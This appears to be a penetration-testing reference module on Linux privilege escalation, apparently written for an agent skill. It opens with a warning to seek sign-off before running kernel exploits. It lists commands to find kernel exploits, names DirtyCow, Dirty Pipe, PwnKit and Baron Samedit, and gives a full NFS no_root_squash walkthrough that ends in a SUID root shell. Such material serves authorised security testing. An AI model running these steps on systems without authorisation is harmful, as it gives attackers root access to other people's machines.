# Kernel Exploits and NFS Privilege Escalation

Loaded on demand from `SKILL.md`. Kernel exploitation is the last resort: it is
unstable, noisy, frequently crashes the target, and a crashed production host
is an incident. Exhaust sudo, SUID, capability, cron, and writable-path
misconfiguration first, and get explicit sign-off before running a kernel
exploit on anything you did not build.

## Kernel Exploits

**Identify Kernel Version:**
```bash
uname -a
cat /proc/version
uname -r
```

**Search for Exploits:**
```bash
# SearchSploit
searchsploit "Linux Kernel $(uname -r | cut -d'-' -f1)"
searchsploit "Linux Kernel 4.4"

# Google search
# Search: "Linux kernel X.X.X exploit"
# Search: "Linux kernel X.X.X privilege escalation"

# Automated tools
linux-exploit-suggester.sh
linux-exploit-suggester-2.pl
```

**Common Kernel Exploits:**
```bash
# DirtyCow (CVE-2016-5195) - Kernel <= 3.19.0-73.8
# https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs

# CVE-2022-0847 (Dirty Pipe) - Kernel 5.8 - 5.16.11
# Overwrite read-only files

# CVE-2021-4034 (PwnKit) - PolicyKit
# Local privilege escalation via pkexec

# CVE-2021-3156 (Baron Samedit) - Sudo < 1.9.5p2

# Compile and run
gcc -pthread exploit.c -o exploit -lcrypt
./exploit
```

**Kernel Exploit Resources:**
- https://github.com/lucyoa/kernel-exploits
- https://github.com/SecWiki/linux-kernel-exploits
- https://github.com/bwbwbwbw/linux-exploit-binaries

## NFS Exploits

**Check NFS Shares:**
```bash
# On target
cat /etc/exports
showmount -e localhost

# From attacker machine
showmount -e 10.10.10.10

# Common misconfig: no_root_squash
# /home *(rw,no_root_squash)
```

**Exploit no_root_squash:**
```bash
# On attacker (as root)
mkdir /tmp/nfs
mount -t nfs 10.10.10.10:/home /tmp/nfs
cd /tmp/nfs

# Create SUID binary
cp /bin/bash .
chmod +s bash

# On target
cd /home
./bash -p  # root shell
```
